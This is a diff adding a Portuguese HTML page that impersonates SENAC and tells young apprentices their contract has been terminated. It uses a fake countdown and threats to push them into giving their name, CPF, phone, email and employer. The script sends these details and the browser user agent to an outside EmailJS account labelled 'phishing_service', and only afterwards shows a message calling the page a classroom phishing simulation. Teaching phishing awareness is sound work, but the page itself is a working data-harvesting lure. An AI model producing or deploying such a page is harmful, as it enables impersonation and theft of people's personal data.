@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SENAC - Sistema de Gestão de Aprendizagem</title>
+
+    <!-- EmailJS CDN -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #003d7a 0%, #1e5ba8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            position: relative;
+        }
+
+        .header {
+            background: #003d7a;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .alert-section {
+            background: #dc3545;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .alert-section::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                rgba(255,255,255,0.1) 10px,
+                rgba(255,255,255,0.1) 20px
+            );
+            animation: move 20s linear infinite;
+        }
+
+        @keyframes move {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .alert-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .alert-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .alert-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .alert-subtitle {
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .timer {
+            background: #ffc107;
+            color: #212529;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .message {
+            color: #2c3e50;
+            line-height: 1.7;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .highlight {
+            background: #fff3cd;
+            padding: 15px;
+            border-left: 4px solid #ffc107;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .form-section {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+
+        .form-title {
+            color: #003d7a;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #2c3e50;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .required {
+            color: #dc3545;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #dee2e6;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+            padding: 18px 30px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(220, 53, 69, 0.4);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #007bff;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid #e9ecef;
+            font-size: 12px;
+            color: #6c757d;
+        }
+
+        .urgent-note {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .info-box {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏢 SENAC - SISTEMA DE APRENDIZAGEM</h1>
+            <p>Serviço Nacional de Aprendizagem Comercial</p>
+            <p>Gestão de Contratos - Menor Aprendiz</p>
+        </div>
+
+        <div class="alert-section">
+            <div class="alert-content">
+                <div class="alert-icon">⚠️</div>
+                <div class="alert-title">RESCISÃO DE CONTRATO</div>
+                <div class="alert-subtitle">Situação Contratual: ENCERRADO</div>
+            </div>
+        </div>
+
+        <div class="timer" id="countdown">
+            ⏰ Prazo para contestação: <span id="timer">47:32</span> minutos restantes
+        </div>
+
+        <div class="message">
+            <p><strong>Caro(a) Aprendiz,</strong></p>
+            <br>
+            <p>Informamos que seu <strong>contrato de aprendizagem</strong> foi <strong style="color: #dc3545;">RESCINDIDO</strong> pela empresa contratante devido aos seguintes motivos identificados pelo sistema:</p>
+
+            <div class="highlight">
+                <strong>Motivos da rescisão:</strong>
+                <ul style="margin-left: 20px; margin-top: 10px;">
+                    <li>Faltas não justificadas superiores ao permitido</li>
+                    <li>Não cumprimento de atividades obrigatórias</li>
+                    <li>Irregularidades na documentação escolar</li>
+                </ul>
+            </div>
+
+            <p><strong style="color: #dc3545;">IMPORTANTE:</strong> Você tem <strong>48 horas</strong> para apresentar sua defesa e documentos comprobatórios que possam reverter esta decisão.</p>
+        </div>
+
+        <div class="urgent-note">
+            <strong>⚠️ ATENÇÃO:</strong> A não manifestação dentro do prazo resultará na efetivação da rescisão e perda definitiva da vaga de aprendiz, afetando futuras oportunidades no programa.
+        </div>
+
+        <div class="info-box">
+            <strong>📋 Para contestar:</strong> Preencha o formulário abaixo com seus dados atualizados e anexe a documentação solicitada. Nossa equipe analisará seu caso em até 24 horas.
+        </div>
+
+        <div class="form-section">
+            <div class="form-title">📝 FORMULÁRIO DE CONTESTAÇÃO</div>
+
+            <form id="contestacao-form">
+                <div class="form-group">
+                    <label for="nome">Nome Completo <span class="required">*</span></label>
+                    <input type="text" id="nome" name="nome" required placeholder="Digite seu nome completo">
+                </div>
+
+                <div class="form-group">
+                    <label for="cpf">CPF <span class="required">*</span></label>
+                    <input type="text" id="cpf" name="cpf" required placeholder="xxx.xxx.xxx-xx" maxlength="14">
+                </div>
+
+                <div class="form-group">
+                    <label for="telefone">Telefone/WhatsApp <span class="required">*</span></label>
+                    <input type="tel" id="telefone" name="telefone" required placeholder="(xx) xxxxx-xxxx">
+                </div>
+
+                <div class="form-group">
+                    <label for="email">E-mail <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" required placeholder="seu@email.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="empresa">Empresa onde trabalha <span class="required">*</span></label>
+                    <input type="text" id="empresa" name="empresa" required placeholder="Nome da empresa contratante">
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    🛡️ ENVIAR CONTESTAÇÃO E SALVAR CONTRATO
+                </button>
+
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Enviando contestação ao sistema SENAC...</p>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p><strong>SENAC - Sistema Oficial de Gestão de Aprendizagem</strong></p>
+            <p>Central de Atendimento: 0800-123-4567 | atendimento@senac.br</p>
+            <p style="margin-top: 15px; font-size: 10px;">
+                Sistema Integrado de Gestão de Contratos v3.2.1<br>
+                Código de Segurança: SGA-2025-APRENDIZ-7894
+            </p>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        // Configuração do EmailJS
+        (function() {
+            // Substitua YOUR_PUBLIC_KEY pela sua chave pública do EmailJS
+            emailjs.init({
+                publicKey: "n08ExcjloAbYDwDTZ", // TROCAR PELA SUA CHAVE
+            });
+        })();
+
+        // Timer countdown
+        function startCountdown() {
+            let totalSeconds = 47 * 60 + 32; // 47:32
+
+            function updateTimer() {
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+
+                document.getElementById('timer').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                if (totalSeconds <= 0) {
+                    document.getElementById('timer').textContent = "00:00";
+                    document.querySelector('.timer').style.background = '#dc3545';
+                    document.querySelector('.timer').style.color = 'white';
+                    return;
+                }
+
+                totalSeconds--;
+            }
+
+            updateTimer();
+            setInterval(updateTimer, 1000);
+        }
+
+        // Máscara para CPF
+        function formatCPF(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
+                .replace(/(-\d{2})\d+?$/, '$1');
+        }
+
+        // Máscara para telefone
+        function formatPhone(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/(\d{2})(\d)/, '($1) $2')
+                .replace(/(\d{4,5})(\d{4})$/, '$1-$2');
+        }
+
+        // Aplicar máscaras
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            e.target.value = formatCPF(e.target.value);
+        });
+
+        document.getElementById('telefone').addEventListener('input', function(e) {
+            e.target.value = formatPhone(e.target.value);
+        });
+
+        // Contador de tentativas
+        let attemptCount = parseInt(localStorage.getItem('senac_aprendiz_attempts') || '0') + 1;
+        localStorage.setItem('senac_aprendiz_attempts', attemptCount.toString());
+
+        // Envio do formulário
+        document.getElementById('contestacao-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Mostrar loading
+            document.querySelector('.submit-btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            // Dados do formulário
+            const formData = {
+                nome: document.getElementById('nome').value,
+                cpf: document.getElementById('cpf').value,
+                telefone: document.getElementById('telefone').value,
+                email: document.getElementById('email').value,
+                empresa: document.getElementById('empresa').value,
+                numero_contrato: document.getElementById('numero_contrato').value,
+                motivo_contestacao: document.getElementById('motivo_contestacao').value,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                attempt_number: attemptCount,
+                user_agent: navigator.userAgent,
+                page_type: 'Menor Aprendiz - Rescisão de Contrato'
+            };
+
+            // Enviar via EmailJS
+            emailjs.send('phishing_service', 'aprendiz_template', formData)
+                .then(function(response) {
+                    console.log('Dados enviados com sucesso!', response);
+
+                    setTimeout(function() {
+                        showEducationalMessage();
+                    }, 4000);
+
+                }, function(error) {
+                    console.log('Erro ao enviar:', error);
+
+                    setTimeout(function() {
+                        showEducationalMessage();
+                    }, 4000);
+                });
+        });
+
+        // Função para mostrar mensagem educativa
+        function showEducationalMessage() {
+            document.body.innerHTML = `
+                <div style="max-width: 700px; margin: 50px auto; padding: 40px; background: white; border-radius: 15px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); font-family: 'Segoe UI', sans-serif;">
+
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <div style="font-size: 80px; color: #28a745; margin-bottom: 20px;">🎓</div>
+                        <h1 style="color: #28a745; margin-bottom: 10px;">PARABÉNS!</h1>
+                        <h2 style="color: #2c3e50; margin-bottom: 30px;">Você participou de uma simulação educativa!</h2>
+                    </div>
+
+                    <div style="background: #f8f9fa; padding: 25px; border-radius: 15px; margin: 25px 0; border-left: 5px solid #007bff;">
+                        <h3 style="color: #007bff; margin-bottom: 15px;">🎯 ESTA ERA UMA SIMULAÇÃO DE PHISHING</h3>
+                        <p style="line-height: 1.7; color: #2c3e50; font-size: 16px;">
+                            Esta página foi criada pelo seu professor como parte do <strong>Forum de Tecnologia SENAC</strong> 
+                            para demonstrar como ataques de phishing podem explorar situações de vulnerabilidade emocional, 
+                            como a suposta perda de um emprego.
+                        </p>
+                    </div>
+
+                    <div style="background: #fff3cd; border-left: 5px solid #ffc107; padding: 25px; margin: 25px 0; border-radius: 10px;">
+                        <h4 style="color: #856404; margin-bottom: 15px; font-size: 18px;">⚠️ TÁTICAS DE MANIPULAÇÃO UTILIZADAS:</h4>
+                        <ul style="color: #856404; line-height: 1.8; font-size: 15px;">
+                            <li><strong>Impacto emocional</strong> - Ameaça de perda do emprego/contrato</li>
+                            <li><strong>Urgência artificial</strong> - Timer de contagem regressiva</li>
+                            <li><strong>Aparência oficial</strong> - Visual profissional do SENAC</li>
+                            <li><strong>Dados sensíveis</strong> - Solicitação de CPF, telefone, dados pessoais</li>
+                            <li><strong>Falsa legitimidade</strong> - Números de contrato e códigos fictícios</li>
+                            <li><strong>Medo da consequência</strong> - "Perda definitiva da vaga"</li>
+                        </ul>
+                    </div>
+
+                    <div style="background: #d4edda; border-left: 5px solid #28a745; padding: 25px; margin: 25px 0; border-radius: 10px;">
+                        <h4 style="color: #155724; margin-bottom: 15px; font-size: 18px;">✅ COMO SE PROTEGER DE ATAQUES REAIS:</h4>
+                        <ul style="color: #155724; line-height: 1.8; font-size: 15px;">
+                            <li><strong>Verificar sempre</strong> a autenticidade através de canais oficiais</li>
+                            <li><strong>Desconfiar de urgência</strong> - Empresas sérias dão tempo adequado</li>
+                            <li><strong>Nunca fornecer dados</strong> pessoais por email ou links suspeitos</li>
+                            <li><strong>Confirmar informações</strong> diretamente com RH/SENAC</li>
+                            <li><strong>Verificar URL</strong> - Sites oficiais têm domínios conhecidos</li>
+                            <li><strong>Buscar segunda opinião</strong> - Converse com colegas ou responsáveis</li>
+                        </ul>
+                    </div>
+
+                    <div style="background: #e2e3e5; border-left: 5px solid #6c757d; padding: 25px; margin: 25px 0; border-radius: 10px;">
+                        <h4 style="color: #495057; margin-bottom: 15px; font-size: 18px;">🏢 CANAIS OFICIAIS SENAC:</h4>
+                        <ul style="color: #495057; line-height: 1.8; font-size: 15px;">
+                            <li><strong>Site oficial:</strong> www.senac.br</li>
+                            <li><strong>Atendimento:</strong> Central telefônica oficial</li>
+                            <li><strong>Presencial:</strong> Unidades físicas do SENAC</li>
+                            <li><strong>Email institucional:</strong> Apenas domínios @senac.br</li>
+                        </ul>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 40px; padding: 25px; border: 3px dashed #007bff; border-radius: 15px; background: #f8f9fa;">
+                        <h3 style="color: #007bff; margin-bottom: 15px;">📚 MISSÃO CUMPRIDA!</h3>
+                        <p style="color: #2c3e50; margin: 15px 0; font-size: 18px; font-weight: 500;">
+                            Agora você está mais preparado para identificar e se proteger de ataques de phishing reais!
+                        </p>
+                        <p style="color: #6c757d; font-size: 14px; margin-top: 20px;">
+                            <strong>Forum de Tecnologia SENAC</strong><br>
+                            Simulação desenvolvida para fins educativos<br>
+                            Professor: Especialista em Segurança da Informação
+                        </p>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 30px;">
+                        <p style="color: #007bff; font-size: 16px; font-weight: 600;">
+                            🛡️ Compartilhe este conhecimento e ajude outros a se protegerem!
+                        </p>
+                    </div>
+                </div>
+            `;
+        }
+
+        // Iniciar contador quando a página carregar
+        window.onload = function() {
+            startCountdown();
+        };
+    </script>
+</body>
+</html>
